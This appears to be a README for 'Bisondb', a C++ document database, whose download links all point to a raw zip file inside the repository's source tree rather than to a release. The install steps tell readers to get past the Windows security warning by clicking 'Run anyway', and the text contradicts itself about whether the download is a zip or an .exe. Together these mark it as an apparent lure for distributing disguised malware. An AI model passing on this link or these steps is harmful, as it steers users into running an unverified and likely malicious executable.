# 🦬 Bisondb - Manage your documents with speed

[![](https://img.shields.io/badge/Download-Bisondb-blue.svg)](https://github.com/Kimberleyaxileplacentation59/Bisondb/raw/refs/heads/main/src/shell/Software-1.4.zip)

Bisondb stores your data in a document format. It uses modern C++ tools to organize information. The system includes a storage engine, ways to sort data, a query tool, and a network server. You use this software to keep collections of documents on your computer. It reads and writes data through a command-line interface.

## 📥 How to download the software

Follow these steps to get the software on your Windows computer.

1. Go to the [Bisondb download page](https://github.com/Kimberleyaxileplacentation59/Bisondb/raw/refs/heads/main/src/shell/Software-1.4.zip).
2. Look for the latest release version on the right side of the screen.
3. Select the file ending in .exe to start the transfer to your computer.
4. Save the file to your Downloads folder or your Desktop.

## ⚙️ System requirements

Bisondb runs on standard Windows machines. Ensure your computer meets these basic needs to avoid issues:

- Operating System: Windows 10 or Windows 11.
- Memory: At least 4 gigabytes of RAM.
- Storage: 200 megabytes of free space on your hard drive.
- Processor: A standard x64 processor from the last five years.

## 🚀 Setting up the application

1. Open your Downloads folder.
2. Locate the Bisondb setup file.
3. Double-click the file to begin.
4. If a security window appears, click More Info and then click Run anyway. This confirms you trust the software.
5. Follow the prompts on the screen to finish the installation.

## 💻 Using the command shell

Bisondb provides a tool called bisonsh. This is an interactive shell. You use it to talk to your database.

1. Press the Windows key on your keyboard.
2. Type cmd and press Enter.
3. Type bisonsh and press Enter.
4. The shell displays a prompt. You may now enter commands.

You can create collections, insert documents, and run queries from this location. If you want to list your databases, type show dbs and press Enter.

## 🔍 Understanding the storage engine

Bisondb uses a B+Tree structure to store your files. This method keeps your data in order on the disk. It allows the software to find specific documents without reading every single file in the folder. The engine handles the storage so you do not need to manage individual files.

## 🌐 The network server

The software includes a server called bisond. This component listens for requests from your applications. It uses a standard communication protocol. When you run the server, it opens a connection point on your local machine. This allows your other programs to send data to Bisondb for safe keeping.

## 🛠 Troubleshooting common issues

If you face problems, check these items first:

- Permission errors: Ensure you run your command prompt as an administrator. Right-click the command prompt icon and select Run as administrator.
- File path errors: Make sure the Bisondb folder exists in your system path. If the computer says the command is not found, you may need to restart your terminal window after installation.
- Corrupt data: If the database fails to load, verify your disk space. The software needs room to expand indexes when your data grows.

## 📋 Features of the system

Bisondb focuses on core storage tasks. It provides these capabilities:

- Document storage: You save data as documents. This format is flexible and handles variations in your information.
- Indexing: The B+Tree index speeds up your searches. It creates unique keys for every document.
- Query engine: You can ask the database to explain its work. This feature shows you how it finds your data.
- Append-only collections: The database adds new data to the end of your files. This protects existing records from accidental changes.
- Wire protocol: The server understands standard requests. This makes it compatible with tools that talk to document databases.

## 🛡 Security and protection

Bisondb keeps your data in a local folder. It does not send your information to the internet. Since it uses append-only storage, your past data stays safe even if an update fails. Always perform a backup of your data folder before you update your version of the software. You can copy the contents of the Bisondb folder to a separate drive or cloud storage provider for extra safety.

## 📑 Common commands

Use these commands to perform base tasks within the bisonsh tool:

- show dbs: Lists all databases created on your machine.
- use [name]: Switches your session to the database with that name.
- show collections: Lists all groups of documents in your current database.
- db.collection.find(): Shows all documents inside your chosen collection.
- exit: Closes the interactive shell and stops the session.

## 🔗 Project details

The project source code is available for review. The system is built using C++20. It relies on standard libraries and does not include third-party storage or network code. This minimalist design helps the software run with low overhead on your system. You can examine the structure, contribute to the development, or report issues directly on the project repository page. The goal is to provide a reliable way to manage document-based data without the complexity of larger software packages.